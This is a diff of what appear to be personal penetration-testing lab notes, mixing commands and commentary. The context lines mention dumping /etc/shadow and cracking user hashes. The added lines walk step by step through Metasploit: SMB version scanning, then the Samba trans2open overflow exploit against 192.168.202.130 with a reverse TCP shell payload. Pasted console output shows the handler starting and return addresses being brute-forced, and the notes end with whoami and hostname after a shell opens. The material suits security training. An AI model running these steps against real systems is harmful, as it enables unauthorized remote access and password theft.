@@ -457,3 +457,76 @@ cat /etc/shadow
 #I have got a root hash and some users hashes
 #take the hashes, extract the etc password files and combine them to unshadow have gain access(uncrack) to one of the users
 
+#note where your routing tables are, your connection to netstat and all that.
+
+#lets run metasploit commands now
+msfconsole
+search smb
+search smb version
+use auxilliary/scanner/smb/smb version
+#try remote host- RHOST- That is where you will set the exploit at
+#run
+set rhosts 192.168.202.130
+run
+#it found something about samba vulnerability-grab it and go and google it
+samba 2.2.1a exploit
+#trans2open has metasploit info, you can go and run search for the trans2open to see what you will get
+search trans2open
+#because it is linux, run this next
+use exploit/linux/samba/trans2open
+options
+set rhosts 192.168.202.130
+#Outputs
+msf6 > search trans2open
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)                                               
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)                                              
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)                                           
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)                                          
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open                                                
+
+msf6 > use exploit/linux/samba/trans2open
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/samba/trans2open) > 
+
+#run
+set rhosts 192.168.202.130
+run
+#Outputs- If you run this on really active host, you should get something different from this
+msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.202.130
+rhosts => 192.168.202.130
+msf6 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 192.168.5.128:4444 
+[*] 192.168.202.130:139 - Trying return address 0xbffffdfc...
+[-] 192.168.202.130:139 - 192.168.202.130 The connection with (192.168.202.130:139) timed out.
+[*] 192.168.202.130:139 - Trying return address 0xbffffcfc...
+[-] 192.168.202.130:139 - 192.168.202.130 The connection with (192.168.202.130:139) timed out.
+[*] 192.168.202.130:139 - Trying return address 0xbffffbfc...
+[-] 192.168.202.130:139 - 192.168.202.130 The connection with (192.168.202.130:139) timed out.
+[*] 192.168.202.130:139 - Trying return address 0xbffffafc...
+[-] 192.168.202.130:139 - 192.168.202.130 The connection with (192.168.202.130:139) timed out.
+[*] 192.168.202.130:139 - Trying return address 0xbffff9fc...
+
+#set a payload to bind it
+set payload linux/x86/
+#there is a meterpreter bind tcp and shell bind tcp from the output
+set payload linux/x86/shell reverse_tcp
+run
+#if that works and gives you the output that you wanted,i.e you are able to bind the shell and exploit it
+#once you "run" and it gives you something like= Started reverse TCP handler on ip and shows you command shell
+#session opened ip. YOU HAVE SUCCESSFULLY EXPLOITED THAT HOST. Then
+#run whoami
+whoami
+hostname
+
+#HEY I HAVE EXPLOITED YOUR MACHINE
+
+
